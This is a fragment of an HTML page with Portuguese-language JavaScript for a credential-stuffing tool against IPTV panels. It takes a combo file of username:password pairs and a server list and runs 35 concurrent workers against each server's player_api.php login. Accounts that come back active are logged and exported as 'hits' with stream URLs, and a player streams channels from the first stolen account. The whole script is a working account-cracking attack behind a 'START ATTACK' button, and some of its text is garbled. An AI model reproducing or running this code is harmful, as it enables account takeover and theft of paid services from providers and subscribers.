    <style>

        .button, .tab { position: relative; overflow: hidden; transition: all 0.2s ease; background-color: transparent; border: 1px solid var(--border-color); color: var(--matrix-green); }
        .button:hover, .tab:hover { background-color: var(--matrix-green); color: #000; box-shadow: 0 0 20px var(--matrix-green); transform: translateY(-2px); }
        .ripple { width: 20px; height: 20px; position: absolute; background: rgba(57, 255, 20, 0.7); border-radius: 50%; transform: scale(0); animation: ripple 0.6s linear; }

        .logs-container { margin-top: 5px; }

        #player-container h2 { text-align: center; color: var(--matrix-green); margin-top: 0; animation: pulse-green 3s infinite; }

    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
    <script>
        // --- SCRIPT DO FUNDO MATRIX ---
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const katakana = 'ã‚¢ã‚¡ã‚«ã‚µã‚¿ãƒŠãƒãƒãƒ¤ãƒ£ãƒ©ãƒ¯ã‚¬ã‚¶ãƒ€ãƒãƒ‘ã‚¤ã‚£ã‚­ã‚·ãƒãƒ‹ãƒŸãƒªã‚¦ã‚¥ã‚¯ã‚¹ãƒ„ãƒŒãƒ•ãƒ ãƒ¦ãƒ¥ãƒ«ã‚°ã‚ºãƒ–ãƒ…ãƒ—ã‚¨ã‚§ã‚±ã‚»ãƒ†ãƒãƒ˜ãƒ¡ãƒ¬ãƒ±ã‚²ã‚¼ãƒ‡ãƒ™ãƒšã‚ªã‚©ã‚³ã‚½ãƒˆãƒãƒ›ãƒ¢ãƒ¨ãƒ§ãƒ­ãƒ²ã‚´ã‚¾ãƒ‰ãƒœãƒãƒ´ãƒƒãƒ³01';
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array.from({ length: columns }).fill(1);
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--matrix-green');
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = katakana.charAt(Math.floor(Math.random() * katakana.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        let matrixInterval = setInterval(drawMatrix, 33);

        // --- SCRIPT DO PAINEL ---
        let hitCount = 0, scanParado = true, playerServer, playerUser, playerPass;
        const hitSound = document.getElementById('hit-sound');

        function createRipple(event) {
            const button = event.currentTarget;
            const circle = document.createElement("span");
            const diameter = Math.max(button.clientWidth, button.clientHeight);
            circle.style.width = circle.style.height = `${diameter}px`;
            circle.style.left = `${event.clientX - button.getBoundingClientRect().left - diameter / 2}px`;
            circle.style.top = `${event.clientY - button.getBoundingClientRect().top - diameter / 2}px`;
            circle.classList.add("ripple");
            button.querySelector(".ripple")?.remove();
            button.appendChild(circle);
        }

        function formatarData(ts) {
            if (!ts) return "N/A";
            const d = new Date(ts * 1000);
            return `${d.getDate().toString().padStart(2, '0')}/${(d.getMonth() + 1).toString().padStart(2, '0')}/${d.getFullYear()}`;
        }
        function updateNick() { document.getElementById('nickDisplay').textContent = document.getElementById('nick').value; }
        setInterval(updateNick, 1000);
        function quit() { alert('Saindo...'); }
        function showTab(tabName) {
            document.querySelectorAll('.log-pane').forEach(p => p.style.display = 'none');
            document.getElementById(tabName === 'activity' ? 'activityContent' : 'hitsContent').style.display = 'block';
            document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tabName));
        }
        function copiarHits() {
            const text = document.getElementById('hitsContent').innerText;
            if (!text.trim()) return alert("Nenhum hit para copiar.");
            navigator.clipboard.writeText(text).then(() => alert("Hits copiados!"));
        }

        let hls;
        function playStream(url) {
            const video = document.getElementById('video-player');
            if (Hls.isSupported()) {
                if (hls) hls.destroy();
                hls = new Hls();
                hls.loadSource(url);
                hls.attachMedia(video);
                hls.on(Hls.Events.MANIFEST_PARSED, () => video.play());
            }
        }

        async function loadChannels() {
            const grid = document.getElementById('channel-grid');
            grid.innerHTML = '<p>Carregando...</p>';
            if (!playerServer) return grid.innerHTML = '<p>Nenhum hit encontrado.</p>';
            try {
                const res = await fetch(`${playerServer}/player_api.php?username=${playerUser}&password=${playerPass}&action=get_live_streams`);
                const channels = await res.json();
                grid.innerHTML = '';
                if (!Array.isArray(channels) || channels.length === 0) return grid.innerHTML = '<p>Nenhum canal ao vivo encontrado.</p>';
                channels.slice(0, 100).forEach(ch => {
                    const btn = document.createElement('button');
                    btn.className = 'button channel-button';
                    btn.textContent = ch.name;
                    btn.onclick = () => playStream(`${playerServer}/live/${playerUser}/${playerPass}/${ch.stream_id}.m3u8`);
                    btn.addEventListener('click', createRipple);
                    grid.appendChild(btn);
                });
            } catch (e) {
                grid.innerHTML = '<p>Erro ao carregar os canais.</p>';
            }
        }

        async function startAttack() {
            if (!scanParado) {
                scanParado = true;
                document.getElementById('activityContent').innerHTML += "<div class='log-error'>ğŸ›‘ Parando...</div>";
                return;
            }
            scanParado = false;
            const servidores = document.getElementById("servidores").value.trim().split('\n').filter(s => s.trim() !== "");
            const comboFile = document.getElementById("combo").files[0];
            const numBots = 35; // Mais rÃ¡pido ainda

            if (servidores.length === 0 || !comboFile) {
                scanParado = true;
                return alert("Preencha a lista de servidores e selecione um combo!");
            }
            
            document.getElementById('activityContent').innerHTML = '';
            document.getElementById('hitsContent').innerHTML = '';
            document.getElementById('player-container').style.display = 'none';
            hitCount = 0;
            document.getElementById('hitsCount').textContent = 0;
            playerServer = null;

            const activityContent = document.getElementById("activityContent");
            const hitsContent = document.getElementById("hitsContent");
            const startButton = document.querySelector('.btn-start');
            
            activityContent.innerHTML = `<div style="color: var(--matrix-green)">Iniciando ${numBots} bots em ${servidores.length} servidor(es)...</div>`;
            document.getElementById('statusText').textContent = 'Status: Rodando';
            startButton.textContent = 'STOP ATTACK';

            const texto = await comboFile.text();
            const comboLinhas = texto.split(/\r?\n/).filter(l => l.includes(":"));
            
            const tasks = [];
            for (const combo of comboLinhas) {
                for (const servidor of servidores) {
                    tasks.push({ combo, servidor });
                }
            }
            
            const totalTasks = tasks.length;
            let processedCount = 0;
            document.getElementById('progressStatus').textContent = `Progresso: 0%`;

            const worker = async () => {
                while (tasks.length > 0 && !scanParado) {
                    const { combo, servidor } = tasks.shift();
                    const [user, pass] = combo.trim().split(":", 2);
                    if (!user || !pass) continue;
                    
                    const servidorLimpo = servidor.trim().replace(/\/$/, "");
                    let hostname;
                    try { hostname = new URL(servidorLimpo).hostname; } catch (e) { hostname = servidorLimpo; }

                    try {
                        const res = await fetch(`${servidorLimpo}/player_api.php?username=${user}&password=${pass}`);
                        const data = await res.json();
                        if (data.user_info?.status?.toLowerCase() === "active") {
                            activityContent.innerHTML += `<div class="log-hit glow">[HIT] (${hostname}) ${user}:${pass}</div>`;
                            hitSound.play();
                            const info = data.user_info;
                            const resultadoTexto = `â™¦ï¸â–‚âœ¬â„³3ğ“¤ğŸ©àª¡á¥´êª–êª€êª€ê«€ğ•£âœ¬â–‚â™¦ï¸\nâ˜¢ï¸ğŸŒ¬Servidor: ${servidorLimpo}\nâ˜¢ï¸ğŸŒ¬UsuÃ¡rio: ${user}\nâ˜¢ï¸ğŸŒ¬Senha: ${pass}\nâ˜¢ï¸ğŸŒ¬Expira em: ${formatarData(info.exp_date)}\nâŠ°---------------------------------âŠ±\nâ˜¢ï¸ğŸŒ¬M3U: ${servidorLimpo}/get.php?username=${user}&password=${pass}&type=m3u\nâŠ°---------------------------------âŠ±\nâ˜¢ï¸ğŸŒ¬M3U8: ${servidorLimpo}/get.php?username=${user}&password=${pass}&type=m3u8\nâŠ°---------------------------------âŠ±\nâ˜¢ï¸ğŸŒ¬EPG: ${servidorLimpo}/xmltv.php?username=${user}&password=${pass}`;
                            const pre = document.createElement('pre');
                            pre.textContent = resultadoTexto;
                            hitsContent.appendChild(pre);
                            hitCount++;
                            document.getElementById('hitsCount').textContent = hitCount;
                            if (hitCount === 1) {
                                playerServer = servidorLimpo;
                                playerUser = user;
                                playerPass = pass;
                                document.getElementById('player-container').style.display = 'block';
                            }
                        } else {
                            activityContent.innerHTML += `<div class="log-fail">[FALHA] (${hostname}) ${user}:${pass}</div>`;
                        }
                    } catch (e) {}
                    processedCount++;
                    const percentage = totalTasks > 0 ? Math.floor((processedCount / totalTasks) * 100) : 0;
                    document.getElementById('progressStatus').textContent = `Progresso: ${percentage}%`;
                    activityContent.scrollTop = activityContent.scrollHeight;
                }
            };
            await Promise.all(Array.from({ length: numBots }, worker));
            
            activityContent.innerHTML += `<div class="log-hit">âœ… VerificaÃ§Ã£o Finalizada.</div>`;
            document.getElementById('statusText').textContent = 'Status: Parado';
            startButton.textContent = 'START ATTACK';
            scanParado = true;
        }

        document.addEventListener('DOMContentLoaded', () => {
            document.querySelector('.btn-start').addEventListener('click', startAttack);
            document.querySelector('.btn-copy').addEventListener('click', copiarHits);
            document.querySelector('.btn-quit').addEventListener('click', quit);
            document.getElementById('btn-load-channels').addEventListener('click', loadChannels);
            document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () => showTab(t.dataset.tab)));
            document.querySelectorAll('.button, .tab').forEach(b => b.addEventListener('click', createRipple));
        });
    </script>
